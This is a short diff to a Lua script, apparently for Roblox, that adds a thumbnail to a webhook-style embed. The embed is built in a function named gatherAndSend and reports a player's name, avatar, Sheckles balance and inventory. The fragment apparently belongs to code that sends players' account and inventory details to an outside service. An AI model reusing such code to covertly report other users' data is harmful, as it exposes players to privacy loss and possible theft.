@@ -137,8 +137,12 @@ local function gatherAndSend()
         content = nil,
         username = player.Name,
         avatar_url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. player.UserId .. "&size=150x150&format=Png&isCircular=false",
+       
         embeds = { {
             title = "**" .. player.Name .. "**",
+            thumbnail = {
+                url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. player.UserId .. "&size=150x150&format=Png&isCircular=false",
+            },
             description = "_ _\n> **🪙 Sheckles  **: " ..
                 (player.leaderstats and player.leaderstats:FindFirstChild("Sheckles") and formatNumberWithCommas(player.leaderstats.Sheckles.Value) or "Unknown") ..
                 "\n_ _\n_ _\n**> 🎒 | Inventory**\n_ _\n_ _",
